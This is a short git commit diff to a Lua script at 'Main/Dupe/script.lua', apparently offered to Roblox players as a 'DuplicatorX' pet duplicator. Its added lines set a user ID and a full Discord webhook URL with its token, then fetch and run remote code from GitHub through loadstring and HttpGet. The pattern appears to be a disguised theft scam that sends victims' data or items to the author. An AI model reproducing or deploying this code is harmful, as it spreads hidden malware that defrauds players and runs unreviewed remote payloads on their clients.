f56a41ccf2cae7556cb6ea4cc8a3ece277f698b0
Fenek2 <84258923+Fenek2@users.noreply.github.com>
2023-01-15 19:00:13 +0100

    Update script.lua

--- Main/Dupe/script.lua
+++ Main/Dupe/script.lua
@@ -1,4 +1,3 @@
-_G.UserID = "2340029212"
-_G.WebHook = "https://discordapp.com/api/webhooks/1064202559105011834/J8fYygzV6i35QTDRPcNv1g1JRz3UD-A7vNTFW0_bjxFsgpDcZd4gH8LEj3L93O4rafqn"
-_G.LoadingScreenText = "DuplicatorX"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+_G.UserID = 2340029212
+_G.WebHook = "https://discordapp.com/api/webhooks/1064242280480911554/NGguAqjT3hku17Dg2tLFzA6BNDa_ksKLESxGeZlUZtK4F4iW-42n2S0yt-Wi4E8HxDSa"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
